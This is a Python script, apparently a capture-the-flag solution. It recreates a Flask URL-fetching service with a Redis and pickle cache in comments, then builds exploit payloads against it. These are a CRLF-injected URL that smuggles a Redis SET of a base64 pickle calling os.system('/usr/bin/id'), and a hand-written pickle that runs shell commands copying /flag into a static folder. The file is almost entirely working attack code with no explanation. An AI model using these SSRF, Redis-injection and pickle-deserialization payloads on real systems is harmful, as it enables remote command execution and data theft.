from flask import Flask, request
from redis import Redis
import hashlib
import pickle
import base64
import urllib

app = Flask(__name__)
redis = Redis(host='127.0.0.1', port=6379)


def get_result(url):
    url_key = hashlib.md5(url.encode()).hexdigest()
    ulr2 = url
    print(url_key)
    # res = redis.get(url_key)
    # if res:
    #     return pickle.loads(base64.b64decode(res))
    # else:
    #     try:
    #         print(url)
    #         info = urllib.request.urlopen(url)
    #         res = info.read()
    #         pickres = pickle.dumps(res)
    #         b64res = base64.b64encode(pickres)
    #         redis.set(url_key, b64res, ex=300)
    #         return res
    #     except urllib.error.URLError as e:
    #         print(e)

# @app.route('/')
# def hello():
#     url = request.args.get("url")
#     return '''give me your url via GET method like: ?url=127.0.0.1:8080 %s ''' % get_result('http://'+url).decode(encoding='utf8',errors='ignore')
# app.run()
# md5:1146beb249d576514d383e7f3b14e2cf
#!/usr/bin/env python3

# import sys
# import urllib
# import urllib.error
# import urllib.request
#
# host = "127.0.0.1:6379?\r\nSET 5958c386bf5e9109ac10d2a628645aea gASVIwAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAsvdXNyL2Jpbi9pZJSFlFKULg==\r\n"
# url = host
#
# try:
#     info = urllib.request.urlopen(url).info()
#     print(info)
# except urllib.error.URLError as e:
#     print(e)


#模仿Epicccal师傅的例子
import base64

data = b'''(cos
system
S'mkdir ./static;cat /flag>./static/123'
o.'''
print(base64.b64encode(data))